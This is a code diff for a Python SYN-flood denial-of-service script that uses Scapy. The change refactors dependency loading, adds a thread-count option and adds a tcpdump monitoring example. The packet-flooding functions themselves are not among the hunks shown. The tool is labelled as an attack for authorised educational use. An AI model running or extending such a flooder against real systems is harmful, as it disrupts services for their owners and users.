@@ -11,10 +11,13 @@ Description:
     Uses Scapy for low-level packet crafting.
 
 Usage:
-    python3 syn_flooder.py <target> <duration> [--port PORT]
+    python3 syn_flooder.py <target> <duration> [--port PORT] [--threads N]
 
 Example:
-    python3 syn_flooder.py 192.168.1.1 10 --port 80
+    python3 syn_flooder.py 192.168.1.1 10 --port 80 --threads 4
+
+Monitor:
+    sudo tcpdump -i eth0 -nn 'tcp[tcpflags] & tcp-syn != 0'
 """
 
 import socket
@@ -22,68 +25,37 @@ import sys
 import argparse
 import time
 import threading
-from datetime import datetime
 
-def _ensure_package_local(package_name, import_name=None, prompt=True):
-    """Minimal local helper to prompt+install a pip package at runtime."""
-    import importlib
-    import subprocess
-    import sys as _sys
+from package_manager import ensure_package
 
-    mod_name = import_name or package_name
+
+IP = None
+TCP = None
+Raw = None
+send = None
+RandShort = None
+
+
+def init_scapy():
+    """Load Scapy only when executing the script."""
+    global IP, TCP, Raw, send, RandShort
+
+    ensure_package("scapy")
     try:
-        return importlib.import_module(mod_name)
+        from scapy.all import IP, TCP, Raw, send, RandShort  # type: ignore
+    except ImportError:
+        print("Erro: Scapy não foi encontrada ou falhou a importação.")
+        print("Instale com: pip install scapy")
+        sys.exit(1)
+
+    # Suppress Scapy warnings
+    import logging
+    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+    try:
+        from scapy.conf import conf  # type: ignore
+        conf.verbose = False
     except Exception:
         pass
-
-    if not prompt:
-        return None
-
-    try:
-        ans = input(f"Dependência '{package_name}' em falta. Instalar agora? [s/N]: ").strip().lower()
-    except Exception:
-        return None
-
-    if ans not in ("", "s", "sim", "y", "yes"):
-        return None
-
-    cmd = [_sys.executable, "-m", "pip", "install", package_name]
-    print(f"A executar: {' '.join(cmd)}")
-    try:
-        res = subprocess.run(cmd)
-    except Exception as e:
-        print(f"Falha ao executar o pip: {e}")
-        return None
-
-    if res.returncode != 0:
-        print(f"pip install terminou com o código {res.returncode}")
-        return None
-
-    try:
-        return importlib.import_module(mod_name)
-    except Exception as e:
-        print(f"Instalado, mas falhou ao importar {mod_name}: {e}")
-        return None
-
-
-# Ensure Scapy is available
-_ensure_package_local("scapy")
-
-try:
-    from scapy.all import IP, TCP, Raw, send, RandShort
-except ImportError:
-    print("Erro: Scapy não foi encontrada ou falhou a importação.")
-    print("Instale com: pip install scapy")
-    sys.exit(1)
-
-# Suppress Scapy warnings
-import logging
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-try:
-    from scapy.conf import conf
-    conf.verbose = False
-except:
-    pass
 
     
 # Section: SYN Flooder functions
@@ -179,6 +151,7 @@ def flood_target(target, target_port, duration, num_threads):
 
 
 def main():
+    init_scapy()
     parser = argparse.ArgumentParser(
         description="SYN Flooder - Ataque de negação de serviço (DoS) via TCP SYN",
         epilog="Apenas para fins educacionais em ambientes autorizados. Requer root/administrator."
